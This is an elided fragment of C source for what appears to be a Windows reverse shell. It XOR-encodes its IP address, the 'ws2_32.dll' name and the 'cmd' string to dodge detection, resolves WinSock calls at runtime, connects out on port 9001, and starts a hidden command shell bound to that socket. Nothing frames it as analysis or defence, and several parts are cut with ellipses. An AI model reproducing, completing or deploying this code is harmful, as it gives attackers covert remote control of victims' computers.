...
#define XOR(buf,k)				_xor_bytes(buf, k)
...
static unsigned char _xor(unsigned char x, unsigned char y) {
    return (x | y) & ~(x & y);  // Equivalent to x ^ y
}

static void _xor_bytes(char* buf, unsigned char key) {
...
void rev() {
	...
	int port = 9001 ;
	char ip[] = {0xef,0xe7,0xec,0xf0,0xef,0xe8,0xe6,0xf0,0xec,0xf0,0xe6, 0xde};
	
	//   ws2_32.dll    0x77  0x73  0x32  0x5f  0x33  0x32  0x2e  0x64  0x6c  0x6c  key
	char ws2_32_dll[] = {0xa1, 0xa5, 0xe4, 0x89, 0xe5, 0xe4, 0xf8, 0xb2, 0xba, 0xba, 0xd6};

	// powershell 0x70, 0x6f, 0x77, 0x65, 0x72, 0x73, 0x68, 0x65, 0x6c, 0x6c,  key
	//	 cmd	  0x63, 0xcd, 0x64, key
	char cmd[] = {0x3c, 0x32, 0x3b, 0x5f};
	...
	XOR(ip, KEY3);
	sa.sin_addr.s_addr = ((INET_ADDR)pInet_addr)(ip); // sets sa fields
	...
	XOR(cmd, KEY2);
	((CREATEPROCESSA)pCreateProcessA)(NULL, (LPSTR)cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, (LPSTARTUPINFOA)&si, &pi); // launches shell bound for socket
